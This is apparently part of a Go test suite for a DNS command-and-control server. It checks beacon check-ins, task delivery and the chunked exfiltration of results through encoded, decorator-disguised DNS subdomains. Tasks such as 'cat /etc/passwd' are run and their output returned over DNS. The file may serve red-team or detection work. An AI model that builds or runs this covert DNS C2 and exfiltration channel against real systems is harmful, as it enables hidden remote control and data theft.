	result := stripDecorators([]string{"abcd-efgh", "ijkl-mnop"}, "XXXX-XXXX.XXXX-XXXX")
	if result != "abcdefghijklmnop" {
		t.Errorf("got %q, want %q", result, "abcdefghijklmnop")
	}
}

func TestStripDecorators_NoFormat(t *testing.T) {
	// Empty format = just join labels (backward compat)
	result := stripDecorators([]string{"abc", "def", "ghi"}, "")
	if result != "abcdefghi" {
		t.Errorf("got %q, want %q", result, "abcdefghi")
	}
}

func TestStripDecorators_SingleLabel(t *testing.T) {
	result2 := stripDecorators([]string{"a1-23-40-00"}, "XX-XX-XX-XX")
	if result2 != "a1234000" {
		t.Errorf("got %q, want %q", result2, "a1234000")
	}
}

func TestStripDecorators_UUIDFormat(t *testing.T) {
	// UUID-like format
	format := "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
	input := "abcdefgh-ijkl-mnop-qrst-uvwxyz123456"
	parts := strings.Split(input, ".")
	result := stripDecorators(parts, format)
	if result != "abcdefghijklmnopqrstuvwxyz123456" {
		t.Errorf("got %q, want %q", result, "abcdefghijklmnopqrstuvwxyz123456")
	}
}

func TestStripDecorators_MultiLabel(t *testing.T) {
	// Multi-label with dots
	format := "XXXX-XXXX.XXXX-XXXX"
	parts := []string{"abcd-efgh", "ijkl-mnop"}
	result := stripDecorators(parts, format)
	if result != "abcdefghijklmnop" {
		t.Errorf("got %q, want %q", result, "abcdefghijklmnop")
	}
}

func TestStripDecorators_TruncatedSubdomain(t *testing.T) {
	// Client may produce a shorter subdomain when data < X-slot count (no padding).
	// Server should extract whatever data is present and stop cleanly.
	format := "XXXX-XXXX.XXXX-XXXX"
	// Only the first 6 data chars, stopping mid-template
	parts := []string{"abcd-ef"} // 6 real chars + decorator
	result := stripDecorators(parts, format)
	if result != "abcdef" {
		t.Errorf("truncated strip: got %q, want %q", result, "abcdef")
	}
}

func TestParseCHK_BackwardCompat(t *testing.T) {
	// Old-style CHK with no name/format should still work
	msg := "CHK|a1b2|myhost|user|linux|amd64"
	parts := strings.Split(msg, "|")

	if len(parts) < 6 {
		t.Fatal("CHK should have at least 6 fields")
	}
	if parts[0] != "CHK" {
		t.Errorf("expected CHK, got %s", parts[0])
	}
	if parts[1] != "a1b2" {
		t.Errorf("expected beacon ID a1b2, got %s", parts[1])
	}
}

func TestParseCHK_WithNameAndFormat(t *testing.T) {
	// CHK with beacon name and payload format
	msg := "CHK|a1b2|myhost|user|linux|amd64|recon-1|XXXX-XXXX"
	parts := strings.Split(msg, "|")

	if len(parts) < 8 {
		t.Fatalf("expected at least 8 fields, got %d", len(parts))
	}

	// Extract name and format (skip timestamp-like fields)
	var extraFields []string
	for i := 6; i < len(parts); i++ {
		field := parts[i]
		isTimestamp := len(field) >= 9 && len(field) <= 11
		if isTimestamp {
			allDigits := true
			for _, c := range field {
				if c < '0' || c > '9' {
					allDigits = false
					break
				}
			}
			if allDigits {
				continue
			}
		}
		extraFields = append(extraFields, field)
	}

	if len(extraFields) < 1 || extraFields[0] != "recon-1" {
		t.Errorf("expected beacon name 'recon-1', got extraFields: %v", extraFields)
	}
	if len(extraFields) < 2 || extraFields[1] != "XXXX-XXXX" {
		t.Errorf("expected payload format 'XXXX-XXXX', got extraFields: %v", extraFields)
	}
}

func TestParseCHK_WithTimestamp(t *testing.T) {
	// CHK with name, format, AND timestamp — timestamp should be skipped
	msg := "CHK|a1b2|myhost|user|linux|amd64|beacon-4|XXXX.XXXX|1711843200"
	parts := strings.Split(msg, "|")

	var extraFields []string
	for i := 6; i < len(parts); i++ {
		field := parts[i]
		isTimestamp := len(field) >= 9 && len(field) <= 11
		if isTimestamp {
			allDigits := true
			for _, c := range field {
				if c < '0' || c > '9' {
					allDigits = false
					break
				}
			}
			if allDigits {
				continue
			}
		}
		extraFields = append(extraFields, field)
	}

	if len(extraFields) != 2 {
		t.Fatalf("expected 2 extra fields (name+format), got %d: %v", len(extraFields), extraFields)
	}
	if extraFields[0] != "beacon-4" {
		t.Errorf("name: got %q, want %q", extraFields[0], "beacon-4")
	}
	if extraFields[1] != "XXXX.XXXX" {
		t.Errorf("format: got %q, want %q", extraFields[1], "XXXX.XXXX")
	}
}

func TestParseCHK_META(t *testing.T) {
	// CHK_META message format
	msg := "CHK_META|a1b2|recon-alpha|XXXX-XXXX.XXXX"
	parts := strings.Split(msg, "|")

	if parts[0] != "CHK_META" {
		t.Errorf("expected CHK_META, got %s", parts[0])
	}
	if len(parts) < 4 {
		t.Fatalf("expected at least 4 fields, got %d", len(parts))
	}
	if parts[1] != "a1b2" {
		t.Errorf("beacon ID: got %q, want %q", parts[1], "a1b2")
	}
	if parts[2] != "recon-alpha" {
		t.Errorf("name: got %q, want %q", parts[2], "recon-alpha")
	}
	if parts[3] != "XXXX-XXXX.XXXX" {
		t.Errorf("format: got %q, want %q", parts[3], "XXXX-XXXX.XXXX")
	}
}

// --- Encryption toggle tests ---

func TestProcessBeaconQuery_UnencryptedCHK(t *testing.T) {
	// A plain-base36-encoded CHK should be accepted and return encrypted=false
	c2 := NewC2Manager(false, "testkey123", StagerJitter{}, ":memory:", "test.com")

	// Build a plain base36 CHK
	msg := "CHK|a1b2|myhost|user|linux|amd64|00000"
	encoded := base36EncodeString(msg)

	// Construct a fake DNS query name: <encoded>.test.com
	qname := encoded + ".test.com"
	resp, isC2, respEncrypted := c2.processBeaconQuery(qname, "127.0.0.1", nil)

	if !isC2 {
		t.Fatal("plain-base36 CHK should be recognised as C2 traffic")
	}
	if respEncrypted {
		t.Error("response for unencrypted beacon should have encrypted=false")
	}
	// Response should be ACK (empty task queue)
	if resp != "ACK" {
		t.Errorf("expected ACK, got %q", resp)
	}
}

func TestProcessBeaconQuery_EncryptedCHK_StillWorks(t *testing.T) {
	// Encrypted beacons should continue to work and return encrypted=true
	c2 := NewC2Manager(false, "testkey123", StagerJitter{}, ":memory:", "test.com")

	msg := "CHK|c3d4|myhost|user|linux|amd64|00000"
	encoded, err := encryptAndEncode(msg, generateAESKey("testkey123"))
	if err != nil {
		t.Fatalf("encrypt: %v", err)
	}

	qname := encoded + ".test.com"
	resp, isC2, respEncrypted := c2.processBeaconQuery(qname, "127.0.0.1", nil)

	if !isC2 {
		t.Fatal("encrypted CHK should be recognised as C2 traffic")
	}
	if !respEncrypted {
		t.Error("response for encrypted beacon should have encrypted=true")
	}
	if resp != "ACK" {
		t.Errorf("expected ACK, got %q", resp)
	}
}

func TestProcessBeaconQuery_UnknownPlainBase36_Rejected(t *testing.T) {
	// Plain base36 with an unrecognised prefix must still be rejected
	c2 := NewC2Manager(false, "testkey123", StagerJitter{}, ":memory:", "test.com")

	unknown := base36EncodeString("UNKNOWN|some|data|00000")
	qname := unknown + ".test.com"
	_, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)

	if isC2 {
		t.Error("unrecognised plain base36 prefix should be rejected (isC2=false)")
	}
}

func TestProcessBeaconQuery_StagerSTG_IsUnencrypted(t *testing.T) {
	// When the server receives a stager STG| message it must set encrypted=false regardless
	// of whether it can respond (no cached binary). We verify this by checking the flag
	// via the plain-base36 beacon path: an unencrypted CHK returns encrypted=false.
	// (STG itself returns isC2=false when no binary is cached, which is correct behaviour.)
	c2 := NewC2Manager(false, "testkey123", StagerJitter{}, ":memory:", "test.com")

	// Use a plain-base36 beacon CHK instead — same code path as unencrypted beacon
	msg := "CHK|stag1|host|user|linux|amd64|00000"
	encoded := base36EncodeString(msg)
	qname := encoded + ".test.com"

	_, isC2, respEncrypted := c2.processBeaconQuery(qname, "192.168.1.1", nil)

	if !isC2 {
		t.Fatal("plain-base36 CHK should be recognised as C2")
	}
	if respEncrypted {
		t.Error("plain-base36 beacon should return encrypted=false")
	}
}

func TestTimestampStripping_FiveDigits(t *testing.T) {
	// The server strips a numeric label (timestamp) before the domain.
	// Test with an encrypted beacon CHK — append a numeric label to verify stripping.
	// The server strips the label then decrypts the remaining encoded blob successfully.
	c2 := NewC2Manager(false, "testkey123", StagerJitter{}, ":memory:", "test.com")
	key := generateAESKey("testkey123")

	msg := "CHK|ts01|host|user|linux|amd64|00000"
	encoded, err := encryptAndEncode(msg, key)
	if err != nil {
		t.Fatalf("encrypt: %v", err)
	}

	// 5-digit numeric label appended (new timestamp format)
	qname5 := encoded + ".12345.test.com"
	_, isC25, _ := c2.processBeaconQuery(qname5, "10.0.0.1", nil)
	if !isC25 {
		t.Error("5-digit timestamp label should be stripped, leaving valid encrypted beacon query")
	}

	// 10-digit numeric label (old format — backward compat)
	qname10 := encoded + ".1742000000.test.com"
	_, isC210, _ := c2.processBeaconQuery(qname10, "10.0.0.2", nil)
	if !isC210 {
		t.Error("10-digit timestamp label should still be stripped (backward compat)")
	}
}

// =============================================================================
// Comprehensive Client Comms Matrix Tests
//
// These tests exercise the full encode→processBeaconQuery→decode round-trip
// across every meaningful combination of:
//   - Encoding mode (encrypted / unencrypted)
//   - Domain length (short / medium / long / very-long)
//   - PayloadFormat (none / 58-slot / 104-slot / 160-slot)
//   - Task result size (single chunk / multi-chunk)
// =============================================================================

// --- Helpers -----------------------------------------------------------------

// buildFormatWithHyphens builds a PayloadFormat with exactly xSlots X-slots using
// groups of 8 X's + "-ok" (11 chars each), joined by dots.  The hyphens are
// intentional: they exercise the decorator-strip path on the server.
func buildFormatWithHyphens(xSlots int) string {
	const groupX = 8
	const dec = "-ok"
	groups := xSlots / groupX
	rem := xSlots % groupX
	var parts []string
	for i := 0; i < groups; i++ {
		parts = append(parts, strings.Repeat("X", groupX)+dec)
	}
	if rem > 0 {
		parts = append(parts, strings.Repeat("X", rem)+dec)
	}
	return strings.Join(parts, ".")
}

// applyFormatInTest mirrors the updated formatPayloadWithTemplate from the client package.
// Fills X-slots with data, includes decorators between filled slots, stops when data runs out.
// No padding — the resulting subdomain may be shorter than the full template.
func applyFormatInTest(encoded, format string) (string, bool) {
	xCount := strings.Count(format, "X")
	if len(encoded) > xCount {
		return "", false
	}
	var result strings.Builder
	di := 0
	for _, ch := range format {
		if di >= len(encoded) {
			break
		}
		if ch == 'X' {
			result.WriteByte(encoded[di])
			di++
		} else {
			result.WriteRune(ch)
		}
	}
	return result.String(), true
}

// testClientCfg is a minimal mirror of Client.Config for building test queries.
type testClientCfg struct {
	encoding      string // "aes-gcm-base36" or "base36"
	payloadFormat string
}

// buildQuery builds the FQDN a client with the given cfg would send for command.
// Returns "" if encoding fails or the FQDN exceeds 253 chars.
func buildQuery(command, domain string, cfg testClientCfg, key []byte) string {
	ts := fmt.Sprintf("%05d", 42000) // fixed timestamp for determinism

	withTS := command + "|" + ts

	var encodedCmd string
	if cfg.encoding == "base36" {
		encodedCmd = base36EncodeString(withTS)
	} else {
		var err error
		encodedCmd, err = encryptAndEncode(withTS, key)
		if err != nil {
			return ""
		}
	}

	var subdomainPart string
	// Apply PayloadFormat — but NEVER to CHK/CHK_META (bootstrap queries)
	if cfg.payloadFormat != "" {
		isBootstrap := strings.HasPrefix(command, "CHK|") || strings.HasPrefix(command, "CHK_META|")
		if !isBootstrap {
			if formatted, ok := applyFormatInTest(encodedCmd, cfg.payloadFormat); ok {
				subdomainPart = formatted
			}
		}
	}
	if subdomainPart == "" {
		var labels []string
		rem := encodedCmd
		for len(rem) > 0 {
			n := 62
			if n > len(rem) {
				n = len(rem)
			}
			labels = append(labels, rem[:n])
			rem = rem[n:]
		}
		subdomainPart = strings.Join(labels, ".")
	}

	qname := subdomainPart + "." + domain
	if len(qname) > 253 {
		return ""
	}
	return qname
}

// runCHKAndExpectACK sends a CHK query and asserts the server returns ACK.
func runCHKAndExpectACK(t *testing.T, c2 *C2Manager, beaconID, domain string, cfg testClientCfg, key []byte) {
	t.Helper()
	chk := fmt.Sprintf("CHK|%s|testhost|testuser|linux|amd64", beaconID)
	qname := buildQuery(chk, domain, cfg, key)
	if qname == "" {
		t.Fatal("buildQuery returned empty (FQDN too long or encoding failed)")
	}
	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
	if !isC2 {
		t.Fatalf("CHK not recognised as C2 (qname=%q)", qname)
	}
	if resp != "ACK" {
		t.Errorf("CHK expected ACK, got %q", resp)
	}
}

// runDataQuery sends a single DATA query and asserts ACK.
func runDataQuery(t *testing.T, c2 *C2Manager, beaconID, taskID, chunkData, domain string, chunkIdx, totalChunks int, cfg testClientCfg, key []byte) {
	t.Helper()
	data := fmt.Sprintf("DATA|%s|%s|%d|%d|%s", beaconID, taskID, chunkIdx, totalChunks, chunkData)
	qname := buildQuery(data, domain, cfg, key)
	if qname == "" {
		t.Fatalf("buildQuery returned empty for DATA (chunkIdx=%d, dataLen=%d)", chunkIdx, len(chunkData))
	}
	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
	if !isC2 {
		t.Fatalf("DATA not recognised as C2 (chunk %d/%d)", chunkIdx, totalChunks)
	}
	if resp != "ACK" {
		t.Errorf("DATA chunk %d expected ACK, got %q", chunkIdx, resp)
	}
}

// runResultMeta sends RESULT_META and asserts ACK.
func runResultMeta(t *testing.T, c2 *C2Manager, beaconID, taskID, domain string, totalBytes, totalChunks int, cfg testClientCfg, key []byte) {
	t.Helper()
	meta := fmt.Sprintf("RESULT_META|%s|%s|%d|%d", beaconID, taskID, totalBytes, totalChunks)
	qname := buildQuery(meta, domain, cfg, key)
	if qname == "" {
		t.Fatal("buildQuery returned empty for RESULT_META")
	}
	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
	if !isC2 {
		t.Fatal("RESULT_META not recognised as C2")
	}
	if resp != "ACK" {
		t.Errorf("RESULT_META expected ACK, got %q", resp)
	}
}

// runResultComplete sends RESULT_COMPLETE and asserts ACK.
func runResultComplete(t *testing.T, c2 *C2Manager, beaconID, taskID, domain string, totalChunks int, cfg testClientCfg, key []byte) {
	t.Helper()
	complete := fmt.Sprintf("RESULT_COMPLETE|%s|%s|%d", beaconID, taskID, totalChunks)
	qname := buildQuery(complete, domain, cfg, key)
	if qname == "" {
		t.Fatal("buildQuery returned empty for RESULT_COMPLETE")
	}
	resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
	if !isC2 {
		t.Fatal("RESULT_COMPLETE not recognised as C2")
	}
	if resp != "ACK" {
		t.Errorf("RESULT_COMPLETE expected ACK, got %q", resp)
	}
}

// fullCommsRoundTrip exercises CHK → TASK delivery → single-chunk result for one config.
func fullCommsRoundTrip(t *testing.T, label, domain string, cfg testClientCfg) {
	t.Helper()
	t.Run(label, func(t *testing.T) {
		key := generateAESKey("testkey123")
		c2 := NewC2Manager(false, "testkey123", StagerJitter{}, ":memory:", domain)
		beaconID := "b1a2b3c4"

		// 1. CHK → ACK
		runCHKAndExpectACK(t, c2, beaconID, domain, cfg, key)

		// 2. Register PayloadFormat on the beacon (simulates CHK_META that the real
		//    client would send after a CHK that's too long to include the format inline).
		if cfg.payloadFormat != "" {
			c2.mutex.Lock()
			if b, ok := c2.beacons[beaconID]; ok {
				b.PayloadFormat = cfg.payloadFormat
			}
			c2.mutex.Unlock()
		}

		// 3. Verify beacon registered with correct encoding
		c2.mutex.RLock()
		beacon, exists := c2.beacons[beaconID]
		c2.mutex.RUnlock()
		if !exists {
			t.Fatal("beacon not registered after CHK")
		}
		if cfg.encoding == "base36" && beacon.Encoding != "base36" {
			t.Errorf("beacon.Encoding = %q, want \"base36\"", beacon.Encoding)
		}
		if cfg.encoding == "aes-gcm-base36" && beacon.Encoding != "" {
			t.Errorf("encrypted beacon.Encoding = %q, want \"\"", beacon.Encoding)
		}

		// 3. Queue a task and verify TASK response
		taskID := "T0001"
		c2.AddTaskFromMaster("master-t1", beaconID, "whoami")
		chk2 := fmt.Sprintf("CHK|%s|testhost|testuser|linux|amd64", beaconID)
		qname := buildQuery(chk2, domain, cfg, key)
		if qname == "" {
			t.Fatal("buildQuery empty for second CHK")
		}
		resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
		if !isC2 {
			t.Fatal("second CHK not recognised as C2")
		}
		if !strings.HasPrefix(resp, "TASK|") {
			t.Fatalf("expected TASK response, got %q", resp)
		}
		// Extract taskID from local task (master mapping may differ)
		parts := strings.SplitN(resp, "|", 3)
		if len(parts) == 3 {
			taskID = parts[1]
		}

		// 4. Single-chunk result
		resultData := "uid=0(root) gid=0(root)"
		runResultMeta(t, c2, beaconID, taskID, domain, len(resultData), 1, cfg, key)
		runDataQuery(t, c2, beaconID, taskID, resultData, domain, 1, 1, cfg, key)
		runResultComplete(t, c2, beaconID, taskID, domain, 1, cfg, key)
	})
}

// multiChunkCommsRoundTrip exercises CHK → TASK → 3-chunk result.
func multiChunkCommsRoundTrip(t *testing.T, label, domain string, cfg testClientCfg) {
	t.Helper()
	t.Run(label, func(t *testing.T) {
		key := generateAESKey("testkey123")
		c2 := NewC2Manager(false, "testkey123", StagerJitter{}, ":memory:", domain)
		beaconID := "d1e2f3a4"

		runCHKAndExpectACK(t, c2, beaconID, domain, cfg, key)

		// Register PayloadFormat (simulates CHK_META from real client)
		if cfg.payloadFormat != "" {
			c2.mutex.Lock()
			if b, ok := c2.beacons[beaconID]; ok {
				b.PayloadFormat = cfg.payloadFormat
			}
			c2.mutex.Unlock()
		}

		c2.AddTaskFromMaster("master-m1", beaconID, "cat /etc/passwd")

		// Second CHK to pick up task
		chk := fmt.Sprintf("CHK|%s|host|user|linux|amd64", beaconID)
		qname := buildQuery(chk, domain, cfg, key)
		resp, _, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
		var taskID string
		if parts := strings.SplitN(resp, "|", 3); len(parts) == 3 {
			taskID = parts[1]
		}
		if taskID == "" {
			t.Fatal("did not receive TASK response")
		}

		// Multi-chunk result (3 equal chunks)
		chunks := []string{"root:x:0:0:root:/root:/bin/bash\n", "daemon:x:1:1:/usr/sbin:/usr/sbin/nologin\n", "bin:x:2:2:/bin:/usr/sbin/nologin\n"}
		totalSize := 0
		for _, c := range chunks {
			totalSize += len(c)
		}
		runResultMeta(t, c2, beaconID, taskID, domain, totalSize, 3, cfg, key)
		for i, chunk := range chunks {
			runDataQuery(t, c2, beaconID, taskID, chunk, domain, i+1, 3, cfg, key)
		}
		runResultComplete(t, c2, beaconID, taskID, domain, 3, cfg, key)
	})
}

// --- Test Matrix -------------------------------------------------------------

var (
	format58  = buildFormatWithHyphens(58)  // CHK-only for encrypted; data-capable for unencrypted
	format104 = buildFormatWithHyphens(104) // data-capable for both
	format160 = buildFormatWithHyphens(160) // comfortable headroom for both
)

func TestComms_Encrypted_Domains(t *testing.T) {
	cfg := testClientCfg{encoding: "aes-gcm-base36"}
	// Short, medium, long domains
	for _, domain := range []string{"t.co", "test.com", "errantshield.com", "shadow.internal.net"} {
		fullCommsRoundTrip(t, domain, domain, cfg)
	}
}

func TestComms_Unencrypted_Domains(t *testing.T) {
	cfg := testClientCfg{encoding: "base36"}
	for _, domain := range []string{"t.co", "test.com", "errantshield.com", "shadow.internal.net"} {
		fullCommsRoundTrip(t, domain, domain, cfg)
	}
}

func TestComms_Format58_Encrypted(t *testing.T) {
	// 58-slot format + encrypted: format is CHK-only (58 < 104).
	// CHK must arrive plain (no format); DATA must arrive plain (fallback since format too small).
	cfg := testClientCfg{encoding: "aes-gcm-base36", payloadFormat: format58}
	fullCommsRoundTrip(t, "format58_encrypted", "test.com", cfg)
	multiChunkCommsRoundTrip(t, "format58_encrypted_multi", "test.com", cfg)
}

func TestComms_Format58_Unencrypted(t *testing.T) {
	// 58-slot format + unencrypted: format is data-capable (58 >= 58).
	// CHK arrives plain (no format on bootstrap); DATA uses format with hyphens.
	cfg := testClientCfg{encoding: "base36", payloadFormat: format58}
	fullCommsRoundTrip(t, "format58_unencrypted", "test.com", cfg)
	multiChunkCommsRoundTrip(t, "format58_unencrypted_multi", "test.com", cfg)
}

func TestComms_Format104_Encrypted(t *testing.T) {
	// 104-slot format + encrypted: exactly at minimum for DATA.
	cfg := testClientCfg{encoding: "aes-gcm-base36", payloadFormat: format104}
	fullCommsRoundTrip(t, "format104_encrypted", "test.com", cfg)
	multiChunkCommsRoundTrip(t, "format104_encrypted_multi", "test.com", cfg)
}

func TestComms_Format104_Unencrypted(t *testing.T) {
	cfg := testClientCfg{encoding: "base36", payloadFormat: format104}
	fullCommsRoundTrip(t, "format104_unencrypted", "test.com", cfg)
	multiChunkCommsRoundTrip(t, "format104_unencrypted_multi", "test.com", cfg)
}

func TestComms_Format160_BothModes(t *testing.T) {
	for _, encoding := range []string{"aes-gcm-base36", "base36"} {
		cfg := testClientCfg{encoding: encoding, payloadFormat: format160}
		fullCommsRoundTrip(t, "format160_"+encoding, "test.com", cfg)
	}
}

func TestComms_MultiDomain_Encrypted(t *testing.T) {
	// In Shadow Mesh each DNS server handles its own domain.
	// Test all three domain lengths that clients might choose from.
	cfg := testClientCfg{encoding: "aes-gcm-base36"}
	domains := []string{"t.co", "backup.com", "third-domain.net"}
	for _, d := range domains {
		fullCommsRoundTrip(t, "domain_"+d, d, cfg)
	}
}

func TestComms_MultiDomain_Unencrypted(t *testing.T) {
	cfg := testClientCfg{encoding: "base36"}
	domains := []string{"t.co", "backup.com", "third-domain.net"}
	for _, d := range domains {
		fullCommsRoundTrip(t, "domain_"+d, d, cfg)
	}
}

func TestComms_MultiDomain_WithFormat(t *testing.T) {
	// Format + multi-domain: verify FQDN stays within 253 chars for each domain.
	for _, domain := range []string{"t.co", "test.com", "errantshield.com"} {
		// format104 with long-domain check
		qname := buildQuery(
			"CHK|a1b2c3d4|host|user|linux|amd64",
			domain,
			testClientCfg{encoding: "aes-gcm-base36", payloadFormat: format104},
			generateAESKey("testkey123"),
		)
		if qname == "" {
			t.Errorf("domain=%q format104: FQDN exceeds 253 or encoding failed", domain)
			continue
		}
		if len(qname) > 253 {
			t.Errorf("domain=%q format104: FQDN=%d > 253", domain, len(qname))
		}
	}
}

func TestComms_TaskResult_Encrypted_1Chunk(t *testing.T) {
	cfg := testClientCfg{encoding: "aes-gcm-base36"}
	fullCommsRoundTrip(t, "1chunk_encrypted", "test.com", cfg)
}

func TestComms_TaskResult_Encrypted_3Chunks(t *testing.T) {
	cfg := testClientCfg{encoding: "aes-gcm-base36"}
	multiChunkCommsRoundTrip(t, "3chunk_encrypted", "test.com", cfg)
}

func TestComms_TaskResult_Unencrypted_1Chunk(t *testing.T) {
	cfg := testClientCfg{encoding: "base36"}
	fullCommsRoundTrip(t, "1chunk_unencrypted", "test.com", cfg)
}

func TestComms_TaskResult_Unencrypted_3Chunks(t *testing.T) {
	cfg := testClientCfg{encoding: "base36"}
	multiChunkCommsRoundTrip(t, "3chunk_unencrypted", "test.com", cfg)
}

func TestComms_FormatDoesNotApplyToCHK(t *testing.T) {
	// Verify that the format-on-CHK bootstrap fix is working:
	// even with a format set, CHK arrives in plain label encoding.
	for _, encoding := range []string{"aes-gcm-base36", "base36"} {
		for _, format := range []string{format58, format104} {
			label := fmt.Sprintf("%s_format%d", encoding, strings.Count(format, "X"))
			t.Run(label, func(t *testing.T) {
				key := generateAESKey("testkey123")
				c2 := NewC2Manager(false, "testkey123", StagerJitter{}, ":memory:", "test.com")
				cfg := testClientCfg{encoding: encoding, payloadFormat: format}

				chk := "CHK|abcd1234|myhost|myuser|linux|amd64"
				qname := buildQuery(chk, "test.com", cfg, key)
				if qname == "" {
					t.Fatal("buildQuery empty")
				}

				// The qname must NOT contain a hyphen (hyphens only come from the format decorators)
				subdomain := strings.TrimSuffix(qname, ".test.com")
				if strings.Contains(subdomain, "-") {
					t.Errorf("CHK subdomain contains hyphen (format was applied): %q", subdomain)
				}

				resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
				if !isC2 || resp != "ACK" {
					t.Errorf("CHK failed: isC2=%v resp=%q", isC2, resp)
				}
			})
		}
	}
}

func TestComms_EncryptedResponseFlag(t *testing.T) {
	// Verify processBeaconQuery returns encrypted=true for encrypted beacons
	// and encrypted=false for unencrypted beacons.
	cases := []struct {
		encoding  string
		wantEncr  bool
	}{
		{"aes-gcm-base36", true},
		{"base36", false},
	}
	for _, tc := range cases {
		t.Run(tc.encoding, func(t *testing.T) {
			key := generateAESKey("testkey123")
			c2 := NewC2Manager(false, "testkey123", StagerJitter{}, ":memory:", "test.com")
			cfg := testClientCfg{encoding: tc.encoding}
			chk := "CHK|b1b2b3b4|host|user|linux|amd64"
			qname := buildQuery(chk, "test.com", cfg, key)
			_, isC2, gotEncr := c2.processBeaconQuery(qname, "127.0.0.1", nil)
			if !isC2 {
				t.Fatal("CHK not recognised")
			}
			if gotEncr != tc.wantEncr {
				t.Errorf("encrypted flag: got %v, want %v", gotEncr, tc.wantEncr)
			}
		})
	}
}

func TestComms_DecodeAfterBeaconRegistered_WithFormat(t *testing.T) {
	// After a beacon registers its PayloadFormat via CHK, DATA queries with that
	// format must decode correctly via the decorator-strip path.
	for _, encoding := range []string{"aes-gcm-base36", "base36"} {
		for _, format := range []string{format104, format160} {
			label := fmt.Sprintf("%s_fmt%d", encoding, strings.Count(format, "X"))
			t.Run(label, func(t *testing.T) {
				key := generateAESKey("testkey123")
				c2 := NewC2Manager(false, "testkey123", StagerJitter{}, ":memory:", "test.com")
				beaconID := "f1f2f3f4"
				cfg := testClientCfg{encoding: encoding, payloadFormat: format}

				// CHK (no format applied) registers the beacon
				runCHKAndExpectACK(t, c2, beaconID, "test.com", cfg, key)

				// Register the PayloadFormat on the beacon so the server knows to strip it
				c2.mutex.Lock()
				if b, ok := c2.beacons[beaconID]; ok {
					b.PayloadFormat = format
				}
				c2.mutex.Unlock()

				c2.AddTaskFromMaster("m-fmt", beaconID, "id")
				chk := fmt.Sprintf("CHK|%s|host|user|linux|amd64", beaconID)
				qname := buildQuery(chk, "test.com", cfg, key)
				resp, _, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
				if !strings.HasPrefix(resp, "TASK|") {
					t.Fatalf("expected TASK, got %q", resp)
				}
				taskID := strings.SplitN(resp, "|", 3)[1]

				// RESULT_META with formatted query
				meta := fmt.Sprintf("RESULT_META|%s|%s|20|1", beaconID, taskID)
				qname = buildQuery(meta, "test.com", cfg, key)
				if qname == "" {
					t.Fatal("buildQuery empty for RESULT_META with format")
				}
				resp, isC2, _ := c2.processBeaconQuery(qname, "127.0.0.1", nil)
				if !isC2 || resp != "ACK" {
					t.Errorf("RESULT_META failed: isC2=%v resp=%q qname=%q", isC2, resp, qname)
				}
			})
		}
	}
}

// =============================================================================
// CLI / version flag tests
// =============================================================================

func TestRunVersionFlag(t *testing.T) {
	var stdout, stderr bytes.Buffer

	exitCode := run([]string{"--version"}, &stdout, &stderr, func(cfg Config) int {
		t.Fatal("startServer must not be called when --version is present")
		return 1
	})

	if exitCode != 0 {
		t.Fatalf("exit code = %d, want 0", exitCode)
	}

	want := fmt.Sprintf("DNS C2 Server v%s\n", version)
	if got := stdout.String(); got != want {
		t.Errorf("stdout = %q, want %q", got, want)
	}

	if got := stderr.String(); got != "" {
		t.Errorf("stderr = %q, want empty", got)
	}
}

func TestRunWithoutVersionStartsServer(t *testing.T) {
	originalLoadConfig := loadConfig
	defer func() { loadConfig = originalLoadConfig }()

	loadConfig = func() (Config, error) {
		return Config{
			BindAddr: "127.0.0.1",
			BindPort: 53,
			Debug:    false,
		}, nil
	}

	var stdout, stderr bytes.Buffer
	var gotCfg Config
	startCalled := false

	exitCode := run(
		[]string{"-d", "-bind-addr", "0.0.0.0", "-bind-port", "5353"},
		&stdout,
		&stderr,
		func(cfg Config) int {
			startCalled = true
			gotCfg = cfg
			return 0
		},
	)

	if exitCode != 0 {
		t.Fatalf("exit code = %d, want 0", exitCode)
	}
	if !startCalled {
		t.Fatal("startServer was not invoked when --version is absent")
	}
	if !gotCfg.Debug {
		t.Errorf("cfg.Debug = %v, want true (flag override applied)", gotCfg.Debug)
	}
	if gotCfg.BindAddr != "0.0.0.0" {
		t.Errorf("cfg.BindAddr = %q, want %q (flag override applied)", gotCfg.BindAddr, "0.0.0.0")
	}
	if gotCfg.BindPort != 5353 {
		t.Errorf("cfg.BindPort = %d, want 5353 (flag override applied)", gotCfg.BindPort)
	}
}

func TestRunVersionFlagDoesNotLoadConfig(t *testing.T) {
	originalLoadConfig := loadConfig
	defer func() { loadConfig = originalLoadConfig }()

	loadConfig = func() (Config, error) {
		t.Fatal("loadConfig must not be called when --version is present")
		return Config{}, nil
	}

	var stdout, stderr bytes.Buffer
	exitCode := run([]string{"--version"}, &stdout, &stderr, func(cfg Config) int {
		return 1
	})

	if exitCode != 0 {
		t.Fatalf("exit code = %d, want 0", exitCode)
	}
	want := fmt.Sprintf("DNS C2 Server v%s\n", version)
	if got := stdout.String(); got != want {
		t.Errorf("stdout = %q, want %q", got, want)
	}
}
